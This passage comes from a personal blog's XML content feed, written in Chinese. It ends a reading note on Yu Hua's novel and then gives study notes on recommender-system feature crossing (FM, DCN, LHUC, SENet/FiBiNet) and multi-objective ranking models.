油盐，一半星辰大海。放一点盐，它就是咸的，放一点糖，它就是甜的，放一点诗意，它就是别人眼里的远方。想调成什么味，全凭自己。”</p><p><strong>如果你正经受着生活分你的那半边苦，也照样可以创造出属于自己的那半份甜。</strong>因为你的世界究竟是何种味道，不是由命运决定的，而是你自己说了算。</p><p>最后，愿我们认真经营，好好生活，<strong>尽情享受自己的半糖人生。</strong></p><p><img src="/2024/10/18/%E8%AF%BB%E4%B9%A6%E8%AE%B0%E5%BD%951%EF%BC%9A%E8%AE%B8%E4%B8%89%E8%A7%82%E5%8D%96%E8%A1%80%E8%AE%B0/image_xJaiBee46a.png"></p><hr><h1 id="8-个人感受"><a href="#8-个人感受" class="headerlink" title="8 个人感受"></a>8 个人感受</h1><p>生活中遇到困难是正常的，并且我认为生活中的苦难是多于幸福的，因为苦难可能不需要我们做什么就会到来，但是幸福需要我们自己去珍惜，去努力获取。在遇到苦难的时候，每个人的做法不同，有的人直面困难不逃避，想办法去解决问题，就像许三观在遇到了苦难之后，一次一次通过自己的努力——卖血来渡过危机。</p><p>也有的人选择躺平，任凭苦难的到来他也无动于衷。最终，被生活摧残的面目全非。此外，许三观也是一个善良的人，他在面对妻子、孩子、邻里以及根龙和阿方，他都是坦诚相待。这也让他在后面一乐生病需要钱的时候，人们都愿意借钱给他。</p><p>感觉自己的写作能力好差，但是余华就能把这些细腻的感情、虔诚的心灵描写的恰到好处，还是要多读些经典作品，感受人间冷暖。</p>]]></content>
      
      
      <categories>
          
          <category> 读书记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 读书记录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSS推荐系统学习笔记6：特征交叉</title>
      <link href="/2024/10/17/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06%EF%BC%9A%E7%89%B9%E5%BE%81%E4%BA%A4%E5%8F%89/"/>
      <url>/2024/10/17/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06%EF%BC%9A%E7%89%B9%E5%BE%81%E4%BA%A4%E5%8F%89/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Factorized-Machine（FM）"><a href="#1-Factorized-Machine（FM）" class="headerlink" title="1 Factorized Machine（FM）"></a>1 Factorized Machine（FM）</h1><h2 id="1-1-线性模型"><a href="#1-1-线性模型" class="headerlink" title="1.1 线性模型"></a>1.1 线性模型</h2><p>设模型有 $d$ 个特征，记作 $\mathbf{x}&#x3D;\left[x_{1}, \cdots, x_{d}\right]$，则线性模型：</p><p>$$<br>p&#x3D;b+\sum_{i&#x3D;1}^{d} w_{i} x_{i}<br>$$</p><p>模型有 $d+1$ 个参数：$\mathbf{w}&#x3D;\left[w_{1}, \cdots, w_{d}\right]$ 和 $b$（偏移项），预测是特征的加权和（只有加，没有乘）。</p><h2 id="1-2-二阶交叉特征"><a href="#1-2-二阶交叉特征" class="headerlink" title="1.2 二阶交叉特征"></a>1.2 二阶交叉特征</h2><p>线性模型 + 二阶交叉特征，其中的 $x_{i} x_{j}$ 是两个特征的交叉，$u_{ij}$ 是两个特征交叉的权重，两个特征不仅能够相加，还能够相乘：</p><p>$$<br>p&#x3D;b+\sum_{i&#x3D;1}^{d} w_{i} x_{i}+\sum_{i&#x3D;1}^{d} \sum_{j&#x3D;i+1}^{d} u_{i j} x_{i} x_{j}<br>$$</p><p>模型有 $O\left(d^{2}\right)$ 个参数，如果 $d$ 比较小，那么这样的模型没有什么问题。如果 $d$ 比较大，那么参数数量就太大了，计算代价会很大，而且很容易出现过拟合。</p><h2 id="1-3-如何减少特征数量"><a href="#1-3-如何减少特征数量" class="headerlink" title="1.3 如何减少特征数量"></a>1.3 如何减少特征数量</h2><p>重点关注交叉特征的权重 $u_{ij}$，可以把所有的小 $u$ 矩阵构成矩阵 $U$。矩阵 $U$ 有 $d$ 行和 $d$ 列，是一个对称矩阵，所以可以做矩阵近似。用矩阵 $V$ 乘 $V^T$ 来近似矩阵 $U$，其中矩阵 $V$ 是 $d$ 行 $k$ 列，$k$ 越大，则乘积越接近于矩阵 $U$。</p><p><img src="/2024/10/17/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06%EF%BC%9A%E7%89%B9%E5%BE%81%E4%BA%A4%E5%8F%89/image_kmou725tHQ.png"></p><p>则公式可以转换成以下：</p><p>$$<br>\begin{array}{l}p&#x3D;b+\sum_{i&#x3D;1}^{d} w_{i} x_{i}+\sum_{i&#x3D;1}^{d} \sum_{j&#x3D;i+1}^{d} u_{i j} x_{i} x_{j} . \\\approx b+\sum_{i&#x3D;1}^{d} w_{i} x_{i}+\sum_{i&#x3D;1}^{d} \sum_{j&#x3D;i+1}^{d}  \mathbf{v}_{i}^{T} \mathbf{v}_{j} b x_{i} x_{j} . \end{array}<br>$$</p><p>Factorized Machine（FM）：</p><p>$$<br>p&#x3D;b+\sum_{i&#x3D;1}^{d} w_{i} x_{i}+\sum_{i&#x3D;1}^{d} \sum_{j&#x3D;i+1}^{d}\left(\mathbf{v}_{i}^{T} \mathbf{v}_{j}\right) x_{i} x_{j}<br>$$</p><p>FM 模型有 $O(kd)$ 个参数（$k \ll d$），这样使得推理的计算量更小，而且不容易出现过拟合。</p><p><strong>总结</strong>：FM 是线性模型的替代品，能用线性回归、逻辑回归的场景，都可以用 FM。FM 使用二阶交叉特征，表达能力比现行模型更强。FM 通过做近似 $u_{i j} \approx \mathbf{v}_{i}^{T} \mathbf{v}_{j}$，FM 把二阶交叉权重的数量从 $O(d^2)$ 降低到 $O(kd)$。</p><hr><h1 id="2-深度交叉网络（DCN）"><a href="#2-深度交叉网络（DCN）" class="headerlink" title="2 深度交叉网络（DCN）"></a>2 深度交叉网络（DCN）</h1><h2 id="2-1-召回、排序框架"><a href="#2-1-召回、排序框架" class="headerlink" title="2.1 召回、排序框架"></a>2.1 召回、排序框架</h2><blockquote><p><strong>双塔模型</strong>：后期融合，两个塔计算出向量之后再计算余弦相似度，其中的网络结构可以任意配置。双塔是一种框架，而不是具体的网络。</p></blockquote><p><img src="/2024/10/17/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06%EF%BC%9A%E7%89%B9%E5%BE%81%E4%BA%A4%E5%8F%89/image_gwoM86ekIN.png"></p><blockquote><p><strong>多目标排序</strong>：网络结构可以任意配置，这个神经网络可以被多个任务共享，称为 shared bottom。</p></blockquote><p><img src="/2024/10/17/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06%EF%BC%9A%E7%89%B9%E5%BE%81%E4%BA%A4%E5%8F%89/image_tn2BM5dQpA.png"></p><blockquote><p><strong>MMoE</strong>：网络结构可以任意配置。</p></blockquote><p><img src="/2024/10/17/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06%EF%BC%9A%E7%89%B9%E5%BE%81%E4%BA%A4%E5%8F%89/image_dt12OVCVA1.png"></p><h2 id="2-2-交叉层"><a href="#2-2-交叉层" class="headerlink" title="2.2 交叉层"></a>2.2 交叉层</h2><p>由下图可知，这个网络的参数都在全连接层中，其余的操作没有可学习的参数。</p><p><img src="/2024/10/17/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06%EF%BC%9A%E7%89%B9%E5%BE%81%E4%BA%A4%E5%8F%89/image_7gB-Gf1euF.png"></p><p>上述过程可以表示为以下公式，其中把输入和输出相加是残差网络中的跳跃连接：</p><p><img src="/2024/10/17/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06%EF%BC%9A%E7%89%B9%E5%BE%81%E4%BA%A4%E5%8F%89/image_a7AHGrljBy.png"></p><h2 id="2-3-交叉网络"><a href="#2-3-交叉网络" class="headerlink" title="2.3 交叉网络"></a>2.3 交叉网络</h2><p>向量 $x_o$ 是 Cross Network 的输入，之后送入上面介绍的交叉层，交叉层输出向量 $x_1$，之后把 $x_0$ 和 $x_1$ 再送入下一个交叉层，以此类推可以加入多个交叉层。</p><p><img src="/2024/10/17/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06%EF%BC%9A%E7%89%B9%E5%BE%81%E4%BA%A4%E5%8F%89/image_LTK5WsSlKl.png"></p><h2 id="2-4-深度交叉网络"><a href="#2-4-深度交叉网络" class="headerlink" title="2.4 深度交叉网络"></a>2.4 深度交叉网络</h2><p>推荐系统的输入是将用户特征、物品特征和其他特征做拼接后送入神经网络，上面的是全连接网络，下面的是交叉网络，两个网络并联。两个网络各输出一个向量，之后把这两个向量做拼接，再送入全连接层，最后再输出一个向量。</p><p><img src="/2024/10/17/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06%EF%BC%9A%E7%89%B9%E5%BE%81%E4%BA%A4%E5%8F%89/image_TFuo0U1B_k.png"></p><p>以上模型架构就是 DCN，可以用于召回和排序，现在在工业界中已经被广泛应用。</p><hr><h1 id="3-LHUC-网络结构"><a href="#3-LHUC-网络结构" class="headerlink" title="3 LHUC 网络结构"></a>3 LHUC 网络结构</h1><p>Learning Hidden Unit Contributions（LHUC）起源于语音识别，快手将 LHUC 应用在推荐精排，称作 PPNet。目前 LHUC 只能用于精排。</p><h2 id="3-1-语音识别中的-LHUC"><a href="#3-1-语音识别中的-LHUC" class="headerlink" title="3.1 语音识别中的 LHUC"></a>3.1 语音识别中的 LHUC</h2><p>语音识别的输入是一段语音信号，我们希望通过对语音信号进行处理，对特征进行变化，然后得到语音中的文字。语音是人说的，不同的人声音会有所区别，所以最好加入一些说话者的特征。</p><p>将说话者的特征送入神经网络，这个神经网络是多个全连接层和 Sigmoid 乘以 2，这样神经网络的输出介于 $[0, 2]$ 之间。之后与语音信号通过全连接层的输出做哈达玛积，这样有的语音信号被放大，有的被缩小。</p><p>把哈达玛积再送入下一个网络，之后再和另一个向量做哈达玛乘积，最后作为 LHUC 的输出。</p><p><img src="/2024/10/17/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06%EF%BC%9A%E7%89%B9%E5%BE%81%E4%BA%A4%E5%8F%89/image_76zj77O277.png"></p><h2 id="3-2-推荐系统排序模型中的-LHUC"><a href="#3-2-推荐系统排序模型中的-LHUC" class="headerlink" title="3.2 推荐系统排序模型中的 LHUC"></a>3.2 推荐系统排序模型中的 LHUC</h2><p>在推荐系统中，两个特征变成了物品特征和用户特征，其他和上面介绍的相同。</p><p><img src="/2024/10/17/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06%EF%BC%9A%E7%89%B9%E5%BE%81%E4%BA%A4%E5%8F%89/image_zTGpy7L6RQ.png"></p><hr><h1 id="4-SENet-Bilinear-Cross"><a href="#4-SENet-Bilinear-Cross" class="headerlink" title="4 SENet &amp; Bilinear Cross"></a>4 SENet &amp; Bilinear Cross</h1><h2 id="4-1-SENet"><a href="#4-1-SENet" class="headerlink" title="4.1 SENet"></a>4.1 SENet</h2><p>SENet 发表在2018年的 CVPR，应用在 CV 领域上，可以将其应用到推荐系统领域。推荐系统用到的离散特征有用户 ID、物品 ID、物品类目和物品关键词等，之后对这些离散特征做 Embedding。设一共有 $m$ 个特征，每个特征是一个 $k$ 维向量，可以把所有特征表示成一个 $m \times k$ 的矩阵。</p><p>之后对 $m \times k$ 的矩阵做 AvgPool，得到一个 $m \times 1$ 的向量，向量的每一个元素对应一个离散特征。用一个全连接层和 ReLU 激活函数把 $m$ 维的向量压缩为 $\frac{m}{r}$ 维的向量，再恢复到 $m$ 维的向量。之后把这个向量和最初的 $m \times k$ 的矩阵相乘，还是得到一个 $m \times k$ 的矩阵。</p><p><img src="/2024/10/17/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06%EF%BC%9A%E7%89%B9%E5%BE%81%E4%BA%A4%E5%8F%89/image__AXerstXP9.png"></p><p>在对每个特征做嵌入时，嵌入的维度可以不同：</p><p><img src="/2024/10/17/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06%EF%BC%9A%E7%89%B9%E5%BE%81%E4%BA%A4%E5%8F%89/image_rEu25nI_48.png"></p><p>SENet 的本质是对离散特征做 field-wise 加权。例如，用户 ID Embedding 是 64 维向量，64 个元素算⼀个 field，获得相同的权重。如果有 $m$ 个 fields，那么权重向量是 $m$ 维。</p><h3 id="4-1-1-特征交叉：内积和哈达玛积"><a href="#4-1-1-特征交叉：内积和哈达玛积" class="headerlink" title="4.1.1 特征交叉：内积和哈达玛积"></a>4.1.1 特征交叉：内积和哈达玛积</h3><p>如果用向量内积做交叉， 最终得到 $m^2$ 个实数。如果用哈达玛乘积做交叉，最终得到 $m^2$ 个向量，必须要人工选一些 pair 做交叉，不能对所有的特征做交叉。在做内积和哈达玛乘积的时候，必须要求两个向量形状相同，如果不同，就不能做内积和哈达玛乘积。</p><p><img src="/2024/10/17/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06%EF%BC%9A%E7%89%B9%E5%BE%81%E4%BA%A4%E5%8F%89/image_3Y4ZSFd0RR.png"></p><h3 id="4-1-2-特征交叉：Bilinear-Cross"><a href="#4-1-2-特征交叉：Bilinear-Cross" class="headerlink" title="4.1.2 特征交叉：Bilinear Cross"></a>4.1.2 特征交叉：Bilinear Cross</h3><p>在上述基础上增加了 $W_{ij}$ 矩阵，最终得到 $m^2$ 个实数，同时也会有 $\frac{m^2}{2}$ 个参数矩阵，</p><p><img src="/2024/10/17/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06%EF%BC%9A%E7%89%B9%E5%BE%81%E4%BA%A4%E5%8F%89/image_xPwKGOjPJl.png"></p><p>用哈达玛乘积替换内积操作，同时也要人工指定一部分特征做交叉：</p><p><img src="/2024/10/17/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06%EF%BC%9A%E7%89%B9%E5%BE%81%E4%BA%A4%E5%8F%89/image_W-12l5MeRi.png"></p><h2 id="4-2-FiBiNet"><a href="#4-2-FiBiNet" class="headerlink" title="4.2 FiBiNet"></a>4.2 FiBiNet</h2><p>把 SENet 和 Bilinear Cross 结合起来就是 FiBiNet，文章发表在 2019 年。FiBiNet 用 SENet 加权和 BiLinear 用在精排模型上确实有收益。</p><p><img src="/2024/10/17/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B06%EF%BC%9A%E7%89%B9%E5%BE%81%E4%BA%A4%E5%8F%89/image_8ff_7Y_deu.png"></p>]]></content>
      
      
      <categories>
          
          <category> 推荐系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 推荐系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSS推荐系统学习笔记5：排序</title>
      <link href="/2024/10/16/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05%EF%BC%9A%E6%8E%92%E5%BA%8F/"/>
      <url>/2024/10/16/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05%EF%BC%9A%E6%8E%92%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="1-多目标排序模型"><a href="#1-多目标排序模型" class="headerlink" title="1 多目标排序模型"></a>1 多目标排序模型</h1><p><img src="/2024/10/16/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05%EF%BC%9A%E6%8E%92%E5%BA%8F/image_cSMKbU1Lwh.png"></p><p>接下来主要研究粗排和精排，粗排和精排的原理差不多，在学习的过程中先不区分粗排和精排。</p><p>对于每篇笔记，系统记录：</p><ol><li>曝光次数（number of impressions）</li><li>点击次数（number of clicks），点击率 &#x3D; 点击次数 &#x2F; 曝光次数</li><li>点赞次数（number of likes），点赞次数 &#x3D; 点赞次数 &#x2F; 点击次数</li><li>收藏次数（number of collects），收藏率 &#x3D; 收藏次数 &#x2F; 点击次数</li><li>转发次数（number of shares），转发率 &#x3D; 转发次数 &#x2F; 点击次数</li></ol><p>排序模型预估点击率、点赞率、收藏率和转发率等多种分数，之后融合这些预估分数（比如加权和），根据融合的分数做排序、截断。</p><h2 id="1-1-多目标排序"><a href="#1-1-多目标排序" class="headerlink" title="1.1 多目标排序"></a>1.1 多目标排序</h2><h3 id="1-1-1-工作过程"><a href="#1-1-1-工作过程" class="headerlink" title="1.1.1 工作过程"></a>1.1.1 工作过程</h3><p><img src="/2024/10/16/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05%EF%BC%9A%E6%8E%92%E5%BA%8F/image_sgZsrP9ELp.png"></p><p>把用户特征、物品特征、统计特征和场景特征都输入神经网络，这些神经网络可以是很简单的神经网络，也可以是复杂的神经网络。</p><p>这个神经网络输出一个向量，之后把这个向量送入四个神经网络，这四个小神经网络各有 2~3 个全连接层，再通过 Sigmoid 激活函数得到点击率、点赞率、收藏率和转发率的预估值，这四个预估值都是实数，位于 $[0,1]$ 之间。</p><h3 id="1-1-2-训练过程"><a href="#1-1-2-训练过程" class="headerlink" title="1.1.2 训练过程"></a>1.1.2 训练过程</h3><p><img src="/2024/10/16/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05%EF%BC%9A%E6%8E%92%E5%BA%8F/image_0Os_wrmPU_.png"></p><p>下面的 $y$ 是用户真实的行为，是一个分类任务，可以使用交叉熵作为损失函数，$p$ 越接近于 $y$，则说明损失越小。之后把四个指标的损失合并为总的损失函数，在收集的历史数据上训练神经网络，做梯度下降。</p><p>$$<br>\sum_{i&#x3D;1}^{4} \alpha_{i} \cdot \operatorname{CrossEntropy}\left(y_{i}, p_{i}\right)<br>$$</p><p>在训练的时候会出现类别不平衡的问题：</p><ol><li>每 100 次曝光，约有 10 次点击、90 次无点击</li><li>每 100 次曝光，约有 10 次收藏、90 次无收藏</li></ol><p><strong>解决方法：</strong>负样本降采样（down-sampling），保留一小部分负样本，让正负样本数量平衡，节约计算。</p><h2 id="1-2-预估值校准"><a href="#1-2-预估值校准" class="headerlink" title="1.2 预估值校准"></a>1.2 预估值校准</h2><p>设正样本、负样本数量为 $n_+$ 和 $n_{-}$，对负样本做降采样，抛弃一部分负样本。使用 $\alpha · n_{-}$ 个负样本，$\alpha \in (0,1)$ 是采样率。由于负样本变小，<strong>预估点击率大于真实点击率</strong>。</p><p>真实点击率的期望值为：</p><p>$$<br>p_{\text {true }}&#x3D;\frac{n_{+}}{n_{+}+n_{-}}<br>$$</p><p>预估点击率的期望值为：</p><p>$$<br>p_{\text {pred }}&#x3D;\frac{n_{+}}{n_{+}+\alpha \cdot n_{-}}<br>$$</p><p>由上面两个等式可得校准公式：</p><p>$$<br>p_{\text {true }}&#x3D;\frac{\alpha \cdot p_{\text {pred }}}{\left(1-p_{\text {pred }}\right)+\alpha \cdot p_{\text {pred }}}<br>$$</p><hr><h1 id="2-MMoE"><a href="#2-MMoE" class="headerlink" title="2 MMoE"></a>2 MMoE</h1><h2 id="2-1-工作过程"><a href="#2-1-工作过程" class="headerlink" title="2.1 工作过程"></a>2.1 工作过程</h2><p><img src="/2024/10/16/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05%EF%BC%9A%E6%8E%92%E5%BA%8F/image_m1giVwAiO0.png"></p><p>中间的 3 个神经网络相当于三个专家，每个专家神经网络各输出一个向量 $x_i$，同时也得到 $p_i$ 和 $q_i$，用于后面对 $x_i$ 的加权平均。</p><p><img src="/2024/10/16/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05%EF%BC%9A%E6%8E%92%E5%BA%8F/image_A5RUq7gkpk.png"></p><p>分别用两个权重进行加权平均得到不同的向量，之后送入不同的神经网络，得到不同指标的预估。</p><h2 id="2-2-极化现象"><a href="#2-2-极化现象" class="headerlink" title="2.2 极化现象"></a>2.2 极化现象</h2><p>上述例子中有两个 Softmax 激活函数，输出都是概率分布，各个元素大于零并且相加等于一。极化现象就是指 Softmax 输出值⼀个接近 1，其余接近 0。</p><p><img src="/2024/10/16/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05%EF%BC%9A%E6%8E%92%E5%BA%8F/image_wi1aeAnW_S.png"></p><p>如果这种现象出现，相当于只使用了其中一个专家，有部分专家死掉了。如果有 $n$ 个专家，那么每个 Softmax 的输入和输出都是 $n$ 向量。</p><p>如何解决极化现象？在训练时，对 Softmax 的输出使用 Dropout，Softmax 输出的 $n$ 个数值被 mask 的概率都是 10%，则每个专家被随机丢弃的概率都是 10%。</p><hr><h1 id="3-融合预估分数"><a href="#3-融合预估分数" class="headerlink" title="3 融合预估分数"></a>3 融合预估分数</h1><p>可以使用简单的加权和：</p><p>$$<br>p_{\text {click }}+w_{1} \cdot p_{\text {like }}+w_{2} \cdot p_{\text {collect }}+\cdots<br>$$</p><p>点击率乘以其他项的加权和：</p><p>$$<br>p_{\text {click }} \cdot\left(1+w_{1} \cdot p_{\text {like }}+w_{2} \cdot p_{\text {collect }}+\cdots\right)<br>$$</p><p>以上两种融合方式都很常见，海外某短视频 APP 的融分公式，跟上面的加权和有些有些区别：</p><p>$$<br>\left(1+w_{1} \cdot p_{\text {time }}\right)^{\alpha_{1}} \cdot\left(1+w_{2} \cdot p_{\text {like }}\right)^{\alpha_{2}} \cdots<br>$$</p><p>国内某短视频 APP 的融分公式，跟上面的做法完全不一样：首先根据预估时长 $p_{\text {time }}$，对 $n$ 篇候选视频做排序。如果某视频排名第 $r_{time}$，则它得分 $\frac{1}{r_{\text {time }}^{\alpha}+\beta}$，其中 $\alpha$ 和 $\beta$ 都是需要调节的超参数。对点击、点赞、转发、评论等预估分数做类似处理，最终融合分数：</p><p>$$<br>\frac{w_{1}}{r_{\text {time }}^{\alpha_{1}}+\beta_{1}}+\frac{w_{2}}{r_{\text {click }}^{\alpha_{2}}+\beta_{2}}+\frac{w_{3}}{r_{\text {like }}^{\alpha_{3}}+\beta_{3}}+\cdots<br>$$</p><p>某电商的融分公式：</p><p>$$<br>曝光 \rightarrow 点击 \rightarrow 加购物车 \rightarrow 付款<br>$$</p><p>模型预估出指标 $p_{click}$、$p_{cart}$ 和 $p_{pay}$，最终融合的分数为：</p><p>$$<br>p_{\text {click }}^{\alpha_{1}} \times p_{\text {cart }}^{\alpha_{2}} \times p_{\text {pay }}^{\alpha_{3}} \times price ^{\alpha_{4}}<br>$$</p><hr><h1 id="4-视频播放建模"><a href="#4-视频播放建模" class="headerlink" title="4 视频播放建模"></a>4 视频播放建模</h1><h2 id="4-1-对视频播放时长的预估"><a href="#4-1-对视频播放时长的预估" class="headerlink" title="4.1 对视频播放时长的预估"></a>4.1 对视频播放时长的预估</h2><p>图文笔记排序的主要依据：点击、点赞、收藏、转发、评论……。视频排序的依据还有<strong>播放时长</strong>和<strong>完播</strong>，如果一个用户完整看完了视频，及时没有收藏、转发和点赞，也能说明用户对这个视频感兴趣。</p><p>但是直接用回归拟合播放时长效果不好，建议用 YouTube 的时长建模。</p><p><img src="/2024/10/16/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05%EF%BC%9A%E6%8E%92%E5%BA%8F/image_XtjGlgXVmm.png"></p><p>把相关特征送入神经网络之后，送入四个全连接层得到相关指标，其中得到一个实数 $z$，之后对 $z$ 做 Sigmoid 变换，即</p><p>$$<br>p&#x3D;\frac{\exp (z)}{1+\exp (z)}<br>$$</p><p>得到 $p$，同时对实际的播放时长 $t$ 做以下变换得到 $y$：</p><p>$$<br>y&#x3D;\frac{t}{1+t}<br>$$</p><p>把 $y$ 作为 $p$ 的标签，可以设计如下的交叉熵损失函数来更新参数：</p><p>$$<br>\operatorname{CE}(y, p)&#x3D;y \cdot \log p+(1-y) \cdot \log (1-p)<br>$$</p><p>可以发现 $p$ 越接近于 $y$，则 $\exp(z)$ 越接近于 $t$，由于 $t$ 是实际的播放时长，所以可以使用 $z$ 来作为播放时长的预估。</p><p>因此在线上工作时，不用计算 $p$，只计算 $\exp(z)$ 来预估时长 $t$。</p><h2 id="4-2-对视频完播的预估"><a href="#4-2-对视频完播的预估" class="headerlink" title="4.2 对视频完播的预估"></a>4.2 对视频完播的预估</h2><h3 id="4-2-1-回归方法"><a href="#4-2-1-回归方法" class="headerlink" title="4.2.1 回归方法"></a>4.2.1 回归方法</h3><p>例如，视频长度 $10$ 分钟，实际播放 $4$ 分钟，则实际播放率为 $y &#x3D; 0.4$，让预估播放率 $p$ 拟合 $y$：</p><p>$$<br>\operatorname{loss} &#x3D;y \cdot \log p+(1-y) \cdot \log (1-p)<br>$$</p><p>线上预估完播率，模型输出 $p &#x3D; 0.73$，意思是预计播放 $73 \%$。</p><h3 id="4-2-2-二元分类方法"><a href="#4-2-2-二元分类方法" class="headerlink" title="4.2.2 二元分类方法"></a>4.2.2 二元分类方法</h3><p>首先需要算法工程师定义完播指标，比如完播 $80\%$，若视频长度 $10$ 分钟，播放 $&gt; 8$ 分钟作为正样本，播放 $&lt; 8$ 分钟作为负样本。之后做二元分类训练模型：播放 $&gt;80\%$ vs $&lt;80\%$。</p><p>线上预估完播率，模型输出 $p &#x3D; 0.73$，意思是：</p><p>$$<br>\mathbb{P}( 播放 &gt;80 \%)&#x3D;0.73.<br>$$</p><p>但是不能直接把预估的完播率用到融分公式，因为短视频更容易完播，但是长视频被看完很难。</p><p><img src="/2024/10/16/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B05%EF%BC%9A%E6%8E%92%E5%BA%8F/image_PgXiwAAnwV.png"></p><p>所以在线上预估完播率，然后根据视频长度做调整：</p><p>$$<br>p_{\text {finish }}&#x3D;\frac{\text { 预估完播率 }}{f(\text { 视频长度 })}<br>$$</p><p>并把 $p_{\text {finish}}$ 作为融分公式中的⼀项。</p><hr><h1 id="5-排序模型的特征"><a href="#5-排序模型的特征" class="headerlink" title="5 排序模型的特征"></a>5 排序模型的特征</h1><h2 id="5-1-用户和物品画像"><a href="#5-1-用户和物品画像" class="headerlink" title="5.1 用户和物品画像"></a>5.1 用户和物品画像</h2><h3 id="5-1-1-用户画像"><a href="#5-1-1-用户画像" class="headerlink" title="5.1.1 用户画像"></a>5.1.1 用户画像</h3><p>可以分为用户画像（User Profile）和物品画像（Item Profile），其中用户画像可以包含以下信息：</p><ol><li>用户 ID（在召回、排序中做 embedding），通常用 32 位或 64 位向量</li><li>人口统计学属性：性别、年龄</li><li>账号信息：新老、活跃度……</li><li>感兴趣的类目、关键词、品牌</li></ol><h3 id="5-1-2-物品画像"><a href="#5-1-2-物品画像" class="headerlink" title="5.1.2 物品画像"></a>5.1.2 物品画像</h3><p>物品画像可以包含以下内容：</p><ol><li>物品 ID（在召回、排序中做 embedding）</li><li>发布时间（或者年龄）</li><li>GeoHash（经纬度编码）、所在城市</li><li>标题、类目、关键词、品牌……</li><li>字数、图片数、视频清晰度、标签数……，反应出物品的质量</li><li>内容信息量、图片美学……，可以训练 CV 和 NLP 模型对物品打分</li></ol><h2 id="5-2-用户和物品统计特征"><a href="#5-2-用户和物品统计特征" class="headerlink" title="5.2 用户和物品统计特征"></a>5.2 用户和物品统计特征</h2><h3 id="5-2-1-用户统计特征"><a href="#5-2-1-用户统计特征" class="headerlink" title="5.2.1 用户统计特征"></a>5.2.1 用户统计特征</h3><p>用户最近30天（7天、1天、1小时）的曝光数、点击数、点赞数、收藏数等，用各种时间力度，可以反应出用户的实时兴趣、短期兴趣和长期兴趣。</p><p>也可以按照笔记图文&#x2F;视频分桶（比如最近7天，该用户对图文笔记的点击率、对视频笔记的点击率），对这两类数据同时做记录，可以反应出用户的偏好。</p><p>按照笔记类目分桶（比如最近30天，用户对美妆笔记的点击率、对美⾷笔记的点击率、对科技数码笔记的点击率），如果用户对美食笔记的点击率偏高，那么说明用户对这个类目的笔记比较感兴趣。</p><h3 id="5-2-2-笔记统计特征"><a href="#5-2-2-笔记统计特征" class="headerlink" title="5.2.2 笔记统计特征"></a>5.2.2 